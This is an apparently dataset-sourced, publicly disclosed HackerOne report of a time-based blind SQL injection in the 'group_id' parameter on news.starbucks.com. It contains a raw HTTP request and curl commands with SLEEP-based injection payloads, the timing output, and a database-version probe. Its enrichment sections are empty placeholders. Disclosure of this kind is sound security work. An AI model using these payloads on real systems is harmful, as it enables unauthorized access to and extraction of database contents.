---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '198292'
original_report_id: '198292'
title: Time-based Blind SQLi on news.starbucks.com
weakness: SQL Injection
team_handle: starbucks
created_at: '2017-01-14T04:52:15.129Z'
disclosed_at: '2017-02-24T19:47:12.100Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 33
asset_identifier: Other assets
asset_type: OTHER
max_severity: critical
tags:
- hackerone
- sql-injection
---

# Time-based Blind SQLi on news.starbucks.com

## Metadata

- HackerOne Report ID: 198292
- Weakness: SQL Injection
- Program: starbucks
- Disclosed At: 2017-02-24T19:47:12.100Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

Hi,

I just found that the post parameter "group_id" for a particularly crafted http request is being vulnerable to injection due to missing parameter sanitization.

PoC:
```
POST / HTTP/1.1
Host: news.starbucks.com
Connection: close
Content-Length: 81
Cache-Control: max-age=0
Origin: https://news.starbucks.com
Content-Type: application/x-www-form-urlencoded

ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1
```

This query will result in an execution of a SLEEP command, delaying the server response time:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=1,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s
user	0m0.000s
sys		0m0.063s
```

If the custom IF statement evaluates to False, the response would be sensibly faster:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(1=2,SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m0.860s
user	0m0.000s
sys		0m0.031s
```

In this way it was possible to detect the dbms version being 5:
```
time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='5',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m4.945s

time curl --data "ACT=55&jsontree={"x":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://news.starbucks.com

real	0m1.005s
```

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
